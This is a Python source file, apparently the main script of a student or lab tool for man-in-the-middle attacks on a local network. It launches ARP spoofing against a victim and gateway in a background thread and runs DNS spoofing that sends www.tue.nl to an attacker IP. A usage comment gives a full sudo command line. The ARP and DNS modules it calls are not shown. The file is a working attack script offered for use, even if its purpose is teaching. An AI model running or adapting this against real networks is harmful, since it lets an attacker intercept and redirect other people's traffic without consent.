import sys
import time
import argparse
import threading
import os

import arp
import dns

def main():
    parser = argparse.ArgumentParser(description="ARP, DNS Spoofing and SSL Stripping Tool. Victim and Gateway IPs required.")
    parser.add_argument("--victim", required=True, help="IP address of the victim machine")
    parser.add_argument("--gateway", required=True, help="IP address of the gateway")
    parser.add_argument("--attacker", required=True, help="IP address of the attacker machine (for DNS spoofing)")
    parser.add_argument("--target-domain", default="www.tue.nl", help="Domain to spoof (e.g., tue.nl)")
    args = parser.parse_args()


    print("[+] Starting ARP Spoofing... Press CTRL+C to stop")

    try:
        
        victim_mac = arp.get_mac(args.victim)
        gateway_mac = arp.get_mac(args.gateway)

        
        if not victim_mac or not gateway_mac:
            print("[-] Could not find MAC addresses. Exiting.")
            sys.exit(1)

        print(f"[+] Victim: {args.victim} ({victim_mac})")
        print(f"[+] Gateway: {args.gateway} ({gateway_mac})")

        # Start ARP Spoofing in a speerate thread
        arp_thread = threading.Thread(
            target=arp.start_arp_spoof, 
            args=(args.victim, args.gateway, victim_mac, gateway_mac),
            daemon=True
        )
        arp_thread.start()

        # Start DNS Spoofing in the main thread
        dns.start_dns_spoof(args.target_domain, args.attacker)

    except KeyboardInterrupt:
        print("\n[+] Stopping ARP Spoofing. Restoring network...")
        arp.restore(args.victim, victim_mac, args.gateway, gateway_mac)

if __name__ == "__main__":
    main()

# USAGE EXAMPLE:
# You need the victim IP, gateway IP, and attacker IP
# The DNS spoofing will redirect requests for www.tue.nl to the attacker IP
# sudo python3 main.py --victim 192.168.1.5 --gateway 192.168.1.1 --attacker 192.168.1.55 